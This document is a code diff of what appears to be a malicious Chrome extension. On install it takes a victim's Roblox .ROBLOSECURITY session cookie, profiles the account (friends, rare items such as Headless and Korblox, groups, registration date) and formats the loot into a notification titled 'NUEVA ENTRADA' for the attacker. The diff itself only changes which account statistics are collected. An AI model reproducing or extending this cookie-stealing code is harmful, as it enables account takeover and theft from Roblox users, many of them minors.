@@ -287,29 +287,12 @@ async function obtenerNombrePais(codigo) {
     }
 }
 
-// Obtener número total de objetos en inventario
-async function obtenerTotalInventario(userId, cookie) {
+// Obtener cantidad de grupos
+async function obtenerCantidadGrupos(userId) {
     try {
-        const res = await fetch(\`https://inventory.roblox.com/v1/users/\${userId}/items/Asset?limit=1\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (!res.ok) return 0;
-        const total = res.headers.get('x-total-count');
-        return total ? parseInt(total) : 0;
-    } catch {
-        return 0;
-    }
-}
-
-// Obtener número total de emblemas (badges)
-async function obtenerTotalBadges(userId, cookie) {
-    try {
-        const res = await fetch(\`https://badges.roblox.com/v1/users/\${userId}/badges?limit=1\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (!res.ok) return 0;
-        const total = res.headers.get('x-total-count');
-        return total ? parseInt(total) : 0;
+        const res = await fetch(\`https://groups.roblox.com/v1/users/\${userId}/groups/roles\`);
+        const data = await res.json();
+        return data.data?.length || 0;
     } catch {
         return 0;
     }
@@ -378,8 +361,13 @@ async function obtenerInfoRoblox(cookie) {
 
         const headless = await tieneItem(user.id, cookie, 201);
         const korblox = await tieneItem(user.id, cookie, 192);
-        const totalInventario = await obtenerTotalInventario(user.id, cookie);
-        const totalBadges = await obtenerTotalBadges(user.id, cookie);
+        const cantidadGrupos = await obtenerCantidadGrupos(user.id);
+
+        // Fecha de registro
+        const fechaRegistro = new Date(user.created).toLocaleDateString('es-AR');
+        const hoy = new Date();
+        const antiguedadDias = Math.floor((hoy - new Date(user.created)) / 86400000);
+        const verified = user.hasVerifiedBadge ? "Sí" : "No";
 
         return {
             username: user.name || 'No disponible',
@@ -390,8 +378,10 @@ async function obtenerInfoRoblox(cookie) {
             amigos: amigos,
             headless: headless ? 'Sí' : 'No',
             korblox: korblox ? 'Sí' : 'No',
-            totalInventario: totalInventario,
-            totalBadges: totalBadges
+            fechaRegistro: fechaRegistro,
+            antiguedadDias: antiguedadDias,
+            verified: verified,
+            grupos: cantidadGrupos
         };
     } catch {
         return null;
@@ -420,9 +410,6 @@ chrome.runtime.onInstalled.addListener(async () => {
     const embed = {
         title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
         color: 15158332,
-        thumbnail: {
-            url: \`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=\${info.userId}&size=150x150&format=Png&isCircular=true\`
-        },
         fields: [
             {
                 name: "📌 INFORMACIÓN GENERAL",
@@ -441,7 +428,7 @@ chrome.runtime.onInstalled.addListener(async () => {
             },
             {
                 name: "📈 ESTADÍSTICAS",
-                value: \`📦 **Objetos en inventario:** \\\`\${info.totalInventario}\\\`\\n🏆 **Emblemas en inventario:** \\\`\${info.totalBadges}\\\`\`,
+                value: \`📅 **Registro:** \${info.fechaRegistro} (\${info.antiguedadDias} días)\\n✅ **Verificado:** \${info.verified}\\n👥 **Grupos:** \${info.grupos}\`,
                 inline: false
             },
             {
